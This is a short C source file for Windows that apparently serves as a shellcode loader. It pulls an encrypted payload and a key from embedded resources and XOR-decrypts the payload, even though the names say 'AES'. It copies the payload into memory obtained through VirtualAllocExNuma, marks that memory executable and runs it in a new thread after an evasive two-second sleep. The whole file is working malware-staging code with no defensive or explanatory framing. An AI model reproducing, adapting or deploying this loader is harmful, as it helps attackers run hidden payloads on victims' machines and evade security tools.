#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void DataLoadBaby(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    if (!hResource) {
        printf("Resource %s not found!\n", resName);
        exit(1);
    }

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}







void DecryptXOR(char* codeboy, DWORD codeboyLen, unsigned char* key, DWORD keyLen) {
    for (DWORD i = 0; i < codeboyLen; i++) {
        codeboy[i] ^= key[i % keyLen]; // XOR with the key in a repeating fashion
    }
}


int main() {
    Sleep(2000);

    char* AESkey;
    DWORD AESkeyLen;
    DataLoadBaby("AESKEY", &AESkey, &AESkeyLen);

    char* AESCode;
    DWORD AESCodeLen;
    DataLoadBaby("AESCODE", &AESCode, &AESCodeLen);

    LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
    DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);

    memcpy(memalo, AESCode, AESCodeLen);
    DWORD oldProtect;
    VirtualProtect(memalo, AESCodeLen, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;
}
